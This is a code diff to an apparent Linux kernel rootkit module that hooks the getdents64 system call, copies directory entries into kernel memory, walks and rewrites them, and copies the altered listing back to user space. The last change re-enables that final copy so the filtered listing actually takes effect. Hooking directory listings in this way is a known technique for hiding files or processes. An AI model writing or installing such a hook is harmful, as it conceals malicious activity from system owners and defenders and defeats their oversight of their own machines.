@@ -6,7 +6,9 @@ asmlinkage long sys_getdents64_hook (const struct pt_regs *pt_regs)
 {
     int  ret = org_getdents64(pt_regs);
     int err;
-    struct linux_dirent64 *dir = (struct linux_dirent64 *)pt_regs->si, *kdirent, *prev = NULL;
+    struct linux_dirent64  *dir ,*kdirent, *prev = NULL;
+    struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;
+
     unsigned long i =0;
     
     //using the real syscall for getting the info
@@ -15,7 +17,7 @@ asmlinkage long sys_getdents64_hook (const struct pt_regs *pt_regs)
     kdirent = kvzalloc(ret, GFP_KERNEL); //alloc memory to kdirent
     if (kdirent == NULL)
         return ret;
-    err = copy_from_user((void *) kdirent, (const void __user *) dir, (unsigned long) ret);//copy from user space: >ret< from >dirent< to >kdirent<
+    err = copy_from_user((void *) kdirent, dirent, (unsigned long) ret);//copy from user space: >ret< from >dirent< to >kdirent<
     printk(KERN_ALERT "copy form user %u", err);
     printk(KERN_ALERT "copy form user 1: %u", err-ret);
 
@@ -56,7 +58,7 @@ asmlinkage long sys_getdents64_hook (const struct pt_regs *pt_regs)
             prev = dir;
         i+=dir->d_reclen;//incrise the offset for the while expersion
     }
-    ///err = copy_to_user(dirent, kdirent, (unsigned long) ret);
+    err = copy_to_user(dirent, kdirent, (unsigned long) ret);
     if (err)//using out for regular out and not for error out
     {
         kvfree(kdirent);
